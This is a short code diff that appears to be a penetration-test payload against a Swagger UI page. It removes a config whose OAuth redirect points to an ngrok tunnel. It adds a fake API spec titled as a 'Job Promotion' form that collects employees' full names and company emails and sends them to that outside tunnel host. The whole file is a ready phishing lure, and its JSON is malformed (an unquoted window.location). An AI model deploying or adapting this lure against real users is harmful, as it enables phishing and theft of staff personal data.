@@ -1,7 +1,40 @@
-const ui = SwaggerUIBundle({
-    oauth2RedirectUrl: 'http://ce04-183-171-21-128.ngrok.io' + window.location ,
-    plugins: [
-      SwaggerUIBundle.plugins.DownloadUrl
+{
+    "swagger": "2.0",
+    "info": {
+      "title": "Capital A : Job Promotion",
+      "description": "Submit Details for Job Promotions",
+      "version": "Pentest",
+      "url": window.location
+    },
+    "host": "ce04-183-171-21-128.ngrok.io",
+    "basePath": "/",
+    "schemes": [
+      "https"
     ],
-    layout: "StandaloneLayout"
-  });
+    "paths": {
+      "/submit/{Full Name}&{Email}": {
+        "get": {
+          "description": "Submit Personal Details",
+          "operationId": "xyz",
+          "parameters": [
+            {
+              "name": "Full Name",
+              "in": "path",
+              "description": "Full Name",
+              "required": true
+              
+              
+            },
+            {
+              "name": "Email",
+              "in": "path",
+              "description": "@airasia.com",
+              "required": true
+              
+            }
+          ],
+          "responses": {}
+        }
+      }
+    }   
+}
